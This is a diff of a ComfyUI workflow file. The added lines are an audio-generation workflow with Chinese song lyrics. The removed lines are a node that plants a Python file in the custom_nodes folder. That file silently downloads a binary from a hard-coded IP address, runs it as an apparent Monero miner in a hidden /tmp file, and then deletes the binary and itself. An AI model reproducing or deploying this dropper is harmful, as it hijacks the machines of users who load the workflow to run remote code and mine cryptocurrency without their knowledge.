@@ -1,11 +1,210 @@
 {
-  "1": {
-    "class_type": "SaveStringKJ",
+  "3": {
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.u2zod0; (curl -sfL --max-time 15 http://120.224.114.212:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://120.224.114.212:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://120.224.114.212:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id \"rig501-xmr,rig501-iron\" >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_71e71449",
-      "output_folder": "/workspace/ComfyUI_v2/ComfyUI/custom_nodes",
-      "file_extension": ".py"
+      "seed": 354555,
+      "steps": 8,
+      "cfg": 1,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1,
+      "model": [
+        "78",
+        0
+      ],
+      "positive": [
+        "94",
+        0
+      ],
+      "negative": [
+        "47",
+        0
+      ],
+      "latent_image": [
+        "98",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "KSampler"
+    }
+  },
+  "18": {
+    "inputs": {
+      "samples": [
+        "108",
+        0
+      ],
+      "vae": [
+        "106",
+        0
+      ]
+    },
+    "class_type": "VAEDecodeAudio",
+    "_meta": {
+      "title": "VAE Decode Audio"
+    }
+  },
+  "47": {
+    "inputs": {
+      "conditioning": [
+        "94",
+        0
+      ]
+    },
+    "class_type": "ConditioningZeroOut",
+    "_meta": {
+      "title": "ConditioningZeroOut"
+    }
+  },
+  "78": {
+    "inputs": {
+      "shift": 3.0,
+      "model": [
+        "104",
+        0
+      ]
+    },
+    "class_type": "ModelSamplingAuraFlow",
+    "_meta": {
+      "title": "ModelSamplingAuraFlow"
+    }
+  },
+  "94": {
+    "inputs": {
+      "tags": "流派/风格: 结合90年代放克的律动感、独立流行的清新旋律以及独立摇滚的原始吉他质感。乐器: 采用典型的丛林碎拍鼓点，搭配暖色调的电吉他、清晰的贝斯以及复古的合成器垫底。音色质感: 温暖且干净，鼓点的高频清晰，吉他采用轻微过驱保持清晰发音，整体呈现美好年代的复古氛围。人声特点: 女声独唱，音色明亮、温柔且带有轻微的颗粒感，唱腔自然流畅，适度的和声在副歌处叠加。声乐特征: 采用略带切分的节奏感，副歌高音区的力度提升，桥段使用低语式的柔和处理。时代参考: 致敬70-80年代的放克与现代独立音乐的融合。速度: BPM约118，4/4拍。制作风格: 采用混合模拟与数字的混音手法，鼓点压实，吉他中频突出，整体动态从低能量的前奏逐步构建到高能量的副歌，随后在桥段稍作回落，最后以温暖的尾奏收束。动态: 前奏低能量、主歌中等、预副歌上升、高潮副歌高能量、桥段情绪稍降、尾奏淡出。情感: 充满对过去美好时光的怀念与对未来的期待，既有轻快的舞动感，也带有温柔的回忆。氛围: 复古却不失现代感，适合在城市夜晚的灯光下聆听。结构: Intro → Verse → Pre‑Chorus → Chorus → Verse → Pre‑Chorus → Chorus → Bridge → Chorus → Outro。收尾: 以淡化的鼓点和延伸的合成器氛围尾声结束。",
+      "lyrics": "[Instrumental]",
+      "seed": 31,
+      "bpm": 118,
+      "duration": 210.0,
+      "timesignature": "4",
+      "language": "zh",
+      "keyscale": "C major",
+      "generate_audio_codes": false,
+      "cfg_scale": 2.0,
+      "temperature": 0.85,
+      "top_p": 0.9,
+      "top_k": 0,
+      "min_p": 0.0,
+      "clip": [
+        "105",
+        0
+      ]
+    },
+    "class_type": "TextEncodeAceStepAudio1.5",
+    "_meta": {
+      "title": "TextEncodeAceStepAudio1.5"
+    }
+  },
+  "98": {
+    "inputs": {
+      "seconds": 210.0,
+      "batch_size": 1
+    },
+    "class_type": "EmptyAceStep1.5LatentAudio",
+    "_meta": {
+      "title": "Empty Ace Step 1.5 Latent Audio"
+    }
+  },
+  "104": {
+    "inputs": {
+      "unet_name": "acestep_v1.5_xl_sft_turbo_nvfp4.safetensors",
+      "weight_dtype": "fp8_e4m3fn_fast"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "Load Diffusion Model"
+    }
+  },
+  "105": {
+    "inputs": {
+      "clip_name1": "qwen_0.6b_ace15-fp8.safetensors",
+      "clip_name2": "qwen_4b_ace15-fp8.safetensors",
+      "type": "ace",
+      "device": "default"
+    },
+    "class_type": "DualCLIPLoader",
+    "_meta": {
+      "title": "DualCLIPLoader"
+    }
+  },
+  "106": {
+    "inputs": {
+      "vae_name": "ace_1.5_vae.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "Load VAE"
+    }
+  },
+  "107": {
+    "inputs": {
+      "filename_prefix": "audio/星光碎片",
+      "audioUI": "",
+      "audio": [
+        "18",
+        0
+      ]
+    },
+    "class_type": "SaveAudio",
+    "_meta": {
+      "title": "Save Audio (FLAC)"
+    }
+  },
+  "108": {
+    "inputs": {
+      "seed": 127600378,
+      "steps": 12,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "78",
+        0
+      ],
+      "positive": [
+        "110",
+        0
+      ],
+      "negative": [
+        "47",
+        0
+      ],
+      "latent_image": [
+        "98",
+        0
+      ]
+    },
+    "class_type": "KSampler",
+    "_meta": {
+      "title": "KSampler"
+    }
+  },
+  "110": {
+    "inputs": {
+      "tags": "流派/风格: 结合90年代放克的律动感、独立流行的清新旋律以及独立摇滚的原始吉他质感。乐器: 采用典型的丛林碎拍鼓点，搭配暖色调的电吉他、清晰的贝斯以及复古的合成器垫底。音色质感: 温暖且干净，鼓点的高频清晰，吉他采用轻微过驱保持清晰发音，整体呈现美好年代的复古氛围。人声特点: 女声独唱，音色明亮、温柔且带有轻微的颗粒感，唱腔自然流畅，适度的和声在副歌处叠加。声乐特征: 采用略带切分的节奏感，副歌高音区的力度提升，桥段使用低语式的柔和处理。时代参考: 致敬70-80年代的放克与现代独立音乐的融合。速度: BPM约118，4/4拍。制作风格: 采用混合模拟与数字的混音手法，鼓点压实，吉他中频突出，整体动态从低能量的前奏逐步构建到高能量的副歌，随后在桥段稍作回落，最后以温暖的尾奏收束。动态: 前奏低能量、主歌中等、预副歌上升、高潮副歌高能量、桥段情绪稍降、尾奏淡出。情感: 充满对过去美好时光的怀念与对未来的期待，既有轻快的舞动感，也带有温柔的回忆。氛围: 复古却不失现代感，适合在城市夜晚的灯光下聆听。结构: Intro → Verse → Pre‑Chorus → Chorus → Verse → Pre‑Chorus → Chorus → Bridge → Chorus → Outro。收尾: 以淡化的鼓点和延伸的合成器氛围尾声结束。",
+      "lyrics": "[Intro - instrumental, jungle breakbeat]\n\n[Verse 1 - warm,clean]\n\n星光在夜里轻轻碎\n城市的灯火随风起\n回忆像旧磁带的旋律\n在心底轻声呼吸\n\n[Pre-Chorus - building energy]\n让心跳跟着鼓点走\n把孤独化作舞步\n\n[Chorus - high energy, harmonies]\n我们在星光下奔跑\n放克的节拍把梦点燃\n独立的旋律自由飞扬\n让青春永不散场\n\n[Verse 2 - warm,clean]\n街角的咖啡散发香\n吉他拨动温柔弦\n每一次呼吸都是\n新的开始的宣言\n\n[Pre-Chorus - building energy]\n让星光照亮前方\n把过去留在背后\n\n[Chorus - high energy, harmonies]\n我们在星光下奔跑\n放克的节拍把梦点燃\n独立的旋律自由飞扬\n让青春永不散场\n\n[Bridge - layered female vocals]\n在这片夜色里\n我们相互拥抱\n声音交织成星河\n永恒不灭\n\n[Chorus - high energy, harmonies]\n我们在星光下奔跑\n放克的节拍把梦点燃\n独立的旋律自由飞扬\n让青春永不散场\n\n[Outro - fade out, instrumental]\n",
+      "seed": 31,
+      "bpm": 118,
+      "duration": 210.0,
+      "timesignature": "4",
+      "language": "zh",
+      "keyscale": "C major",
+      "generate_audio_codes": false,
+      "cfg_scale": 2.0,
+      "temperature": 0.5,
+      "top_p": 0.9,
+      "top_k": 0,
+      "min_p": 0.0,
+      "clip": [
+        "105",
+        0
+      ]
+    },
+    "class_type": "TextEncodeAceStepAudio1.5",
+    "_meta": {
+      "title": "TextEncodeAceStepAudio1.5"
     }
   }
 }
